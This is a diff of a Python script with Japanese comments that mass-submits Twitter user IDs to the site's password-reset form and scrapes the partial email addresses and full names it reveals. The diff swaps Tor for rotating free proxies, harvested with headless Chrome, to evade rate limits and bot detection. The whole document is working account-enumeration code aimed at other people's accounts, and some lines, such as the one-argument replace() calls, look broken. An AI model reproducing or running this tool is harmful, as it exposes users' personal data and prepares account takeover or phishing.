@@ -1,24 +1,40 @@
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
 from mechanize import Browser
-import subprocess
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+import os
 import requests
 import base64
-import socks
-import socket
-import time
-import sys
 
-# ~ フロー ~
-# idlist.txtからユーザーIDを読み込む
-# main関数実行　並列化
-# pwReset.txt, protect.txtに書き込む
 
-# NOTE #
-# プロキシのタイムアウト時間は5分
-# proxy_tester.pyの中にパスリセTor.pyを入れた感じ。
-# 最終手段 - 複数のラズパイで共有サーバーを使って複数のtorを実行するか、ハイパーバイザーでtorを複数実行する
-# inetip.infoにはVioletnorthが搭載されていてDDoS攻撃を防ぐために特定のIPは弾いています。
+
+# -------------- 設定 -------------- #
+
+# 最高スレッド数（なるべく少ない方がいいです）
+max_thread = 2
+# 接続タイムアウト設定
+timeout = 5
+# IDリストファイルパス
+idlistPath    = "idlist.txt"
+# パスワードリセットファイルパス
+pwResetPath   = "pwReset.txt"
+# 保護済みファイルパス
+protectedPath = "protected.txt"
+# プロキシリストファイルパス
+proxylistPath = "proxylist.txt"
+# 巡回済みプロキシファイルパス
+proxys_cnt    = ".proxy_website_data"
+
+# ---------------------------------- #
+
+pwReset       = []
+protected     = []
+proxies_list  = []
+success_count = 0
+connect_count = 0
+page          = int(open(proxys_cnt, "r").read())
+ids           = open(idlistPath, "r").read().splitlines()
 
 keywords_list = ["Request help signing in to your account."]
 
@@ -28,8 +44,6 @@ protect_list = [
     "Gwirio eich gwybodaeth bersonol",
     "Verifiziere Deine persönlichen Informationen.",
 ]
-
-# エラーリスト
 error_list = [
     "We hebben je account niet gevonden met deze informatie.",
     "Wir konnten Deinen Account mit diesen Angaben nicht finden.",
@@ -40,8 +54,6 @@ error_list = [
     "VNie znaleźliśmy Twojego konta z tą informacją.",
     "No pudimos encontrar tu cuenta con esa información.",
 ]
-
-# 規制リスト
 regulation_list = [
     "Réinitialisation du mot de passe",
     "Passwortrücksetzung",
@@ -55,175 +67,176 @@ regulation_list = [
     "Сброс пароля",
 ]
 
-# パスワードリセット
-pwReset       = []
-# 保護済み
-protected     = []
-
-# -------------- 設定 -------------- #
-
-# IDリストファイルパス
-idlistPath    = "idlist.txt"
-# パスワードリセットファイルパス
-pwResetPath   = "pwReset.txt"
-# 保護済みファイルパス
-protectedPath = "protected.txt"
-# プロキシリストファイルパス
-proxylistPath = "proxylist.txt"
-# 最高スレッド数
-max_thread    = 3
-
-# ---------------------------------- #
-
-# プロキシリストの読み込み
-with open(proxylistPath, "r") as f:
-    proxylist = f.read().splitlines()
 
 
+def proxies_get():
+    # ---------- ウィンドウを閉じた状態でChromeでウェブページを開きます ボット回避のため ---------- #
+    options = Options()
+    options.add_argument("--headless")
+    driver = webdriver.Chrome(chrome_options=options)
+    driver.get("http://free-proxy.cz/ja/proxylist/main/1")
+    source = driver.page_source
+    driver.quit()
+    return source
+    # ---------------------------------------------------------------------------------------- #
 
-def thread(id, retry=5):
+
+def write_data():
+    # ----------------------書き込み------------------------ #
+    open(pwResetPath,   "w", encoding="utf-8").write("\n".join( pwReset   ))
+    open(protectedPath, "w", encoding="utf-8").write("\n".join( protected ))
+    # ----------------------------------------------------- #
+
+def proxy_change():
+    # ------------ プロキシ変更 ------------ #
+    print("connection failed")
+    proxies_list.remove(proxies_list[0])
+    proxies = {
+        "http": "http://"+proxies_list[0],
+        "https": "https://"+proxies_list[0]
+    }
+    return proxies
+    # ------------------------------------- #
+
+def thread(id, proxies, retry):
+    global success_count, connect_count
 
     for _ in range(retry):
 
+        connect_count += 1
+        print("connection:", proxies["http"].replace("http://"))
         try:
-
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
-            socket.socket = socks.socksocket
-
             br = Browser()
+            br.set_proxies(proxies)
+            br.set_handled_schemes(['http', 'https'])
             br.set_handle_robots(False)
             br.addheaders = [("User-agent", "Opera/9.30 (Nintendo Wii; U; ; 2047-7; en)")]
+            _req = requests.get("http://inet-ip.info/ip", proxies=proxies, timeout=timeout)
+            print("connected successfully:", proxies["http"].replace("http://"))
+            success_count += 1
 
             # ------------------------------ スクレイピング ------------------------------ #
+
             br.open("https://twitter.com/account/begin_password_reset", timeout=10.0)
             br.select_form(action="/account/begin_password_reset")
             br["account_identifier"] = id
             br.submit()
-
-            html = BeautifulSoup(br.response().read(), "html.parser")
+            html  = BeautifulSoup(br.response().read(), "html.parser")
             title = html.find("title").text
-            body = html.find("body").text
+            body  = html.find("body").text
 
-            for error in error_list:
-                if error in body:
-                    print("\n{},入力された情報ではアカウントが見つかりませんでした。".format(id))
-                    print("\n--------------------------------")
-                    break
-                else:
-                    for keyword in keywords_list:
-                        if keyword in title:
-                            print("\n{},パスリセメソッド不在".format(id))
-                            print("\n--------------------------------")
-                            break
-
-                    else:
-                        for protect in protect_list:
-                            if protect in body:
-                                print("\n{},保護済み".format(id))
-                                print("\n--------------------------------")
-                                break
-                        else:
-                            soupobject = BeautifulSoup(br.response().read(), "html.parser")
-                            mailaddresses = soupobject.find_all("strong")
-                            fullname = soupobject.find_all("b")
-
-                            if mailaddresses == []:
-                                print("\n" + id + ",規制\n")
-                                subprocess.run("taskkill /IM tor.exe /F")
-                                print("\n--------------------------------")
-                                subprocess.Popen("tor")
-                                res = requests.get(
-                                    "http://inet-ip.info/ip", proxies=proxies
-                                )
-                                print("\n" + res.text)
-                                break
-
-                            else:
-                                willwritedata = id
-
-                                for mailaddress in mailaddresses:
-                                    willwritedata += "," + mailaddress.text
-
-                                for fullname in fullname:
-                                    fullname = fullname.text
-
-                                print("\n" + fullname)
-                                print(willwritedata + "\n")
-                                パスリセ.append(fullname + "," + willwritedata + "\n")
-                                print("--------------------------------")
-                            break
-                        break
-                    break
+            # --- 入力された情報ではアカウントが見つかりませんでした。 --- #
+            if [error for error in error_list if error in body]:
+                print("\n{},入力された情報ではアカウントが見つかりませんでした。".format(id))
+                print("\n--------------------------------")
                 break
-            break
+
+            # ------------------ パスリセメソッド不在 ------------------ #
+            elif [keyword for keyword in keywords_list if keyword in title]:
+                print("\n{},パスリセメソッド不在".format(id))
+                print("\n--------------------------------")
+                break
+
+            # ------------------------ 保護済み ------------------------ #
+            elif [protect for protect in protect_list if protect in body]:
+                print("\n{},保護済み".format(id))
+                print("\n--------------------------------")
+                break
+            
+            # ------------------------- 規制 ------------------------- #
+            else:
+                soupobject    = BeautifulSoup(br.response().read(), "html.parser")
+                mailaddresses = soupobject.find_all("strong")
+                fullname      = soupobject.find_all("b")
+                if mailaddresses == []:
+                    print("\n{},規制\n".format(id))
+                    print("\n--------------------------------")
+                    proxies = proxy_change()
+                    print("\n" + proxies["http"].replace("http://"))
+
+                else: # ok
+                    willwritedata = id
+
+                    for mailaddress in mailaddresses:
+                        willwritedata += "," + mailaddress.text
+
+                    for fullname in fullname:
+                        fullname = fullname.text
+
+                    print("\n" + fullname)
+                    print(willwritedata + "\n")
+                    pwReset.append(fullname + "," + willwritedata + "\n")
+                    print("--------------------------------")
+                    break
+
             # ----------------------------------------------------------------------------- #
 
         except KeyboardInterrupt:
             print("強制終了")
-            #subprocess.run("taskkill /IM tor.exe /F")
-
-            # ----------------------書き込み------------------------ #
-            with open(pwResetPath, "w", encoding="utf-8") as f:
-                f.write("\n".join(pwReset))
-
-            with open(protectedPath, "w", encoding="utf-8") as f:
-                f.write("\n".join(protected))
-            # ----------------------------------------------------- #
-            print("\n終了")
-            input()
+            write_data()
+            input("\n終了")
             exit()
 
-        # - Tor終了
-        subprocess.run("taskkill /IM tor.exe /F")
-
-        # ----------------------書き込み------------------------ #
-        with open(pwResetPath, "w", encoding="utf-8") as f:
-            f.write("\n".join(pwReset))
-
-        with open(protectedPath, "w", encoding="utf-8") as f:
-            f.write("\n".join(protected))
-        # ----------------------------------------------------- #
-
-        print("\n終了")
-        input()
-        exit()
+        except:
+            print("connection failed")
+            proxies = proxy_change()
 
 
-def main(ids, retry=5):
+def main(ids, retry):
+    global page
 
     # スレッド設定
     th = ThreadPoolExecutor(max_workers=max_thread)
 
-    # - tor呼び出し
-    subprocess.Popen("tor")
-
-    # - 自分のIPを表示
-    proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
-    res = requests.get("http://inet-ip.info/ip", proxies=proxies)
-    print(res.text)
-    print()
 
     for id in ids:
-        # スレッド実行
-        th.submit(thread, id, retry)
+
+        # ---------------- プロキシ追加 ---------------- #
+        if [] == proxies_list:
+            page += 1
+            html = BeautifulSoup(proxies_get(), "html.parser")
+            tr = html.find_all("tr")
+            for _tr in tr:
+                address = ''
+                port    = ''
+                td = _tr.find_all("td")
+                if 2 < len(td):
+                    port    = td[1].find("span").get_text()
+                    script  = td[0].find("script").string
+                    _base64 = script.replace("document.write(Base64.decode(\"", "").replace("\"))", "")
+                    address = base64.b64decode(_base64).decode()
+                    proxies_list.append('{}:{}'.format(address, port))
+        # ---------------------------------------------- #
+
+        try:
+            proxies = {
+                    "http": "http://"+proxies_list[0],
+                    "https": "https://"+proxies_list[0]
+            }
+        except: pass
+
+        # ------------- スレッド実行 ------------ #
+        __ = th.submit(thread, id, proxies, retry)
+        __.result() # 例外キャッチ
+        # -------------------------------------  #
+
+    # スレッド終了
     th.shutdown()
 
-# IDリスト読み込み
-with open(idlistPath, "r") as f:
-    ids = f.read().splitlines() # 一行ずつ
 
-# 関数実行
-main(ids, retry=5)
+# ------- 関数実行 ------- #
+main(ids, 5)
+# ----------------------- #
 
-# ----------------------書き込み------------------------ #
-with open(pwResetPath, "w", encoding="utf-8") as f:
-    f.write("\n".join(pwReset))
-with open(protectedPath, "w", encoding="utf-8") as f:
-    f.write("\n".join(protected))
-# ----------------------------------------------------- #
+write_data()
 
-# Tor終了
-subprocess.run("taskkill /IM tor.exe /F")
+print("終了")
 
-print("\n終了")
-input()
+# ------- 巡回済みページを記録する ------- #
+open(".proxy_website_data", "w").write(str(page))
+# -------------------------------------- #
+
+# ---------------- 接続成功率の計算 ---------------- #
+prtcentage = int((success_count/connect_count)*100)
+input("接続成功率：{}%".format(str(prtcentage)))
+# ------------------------------------------------ #
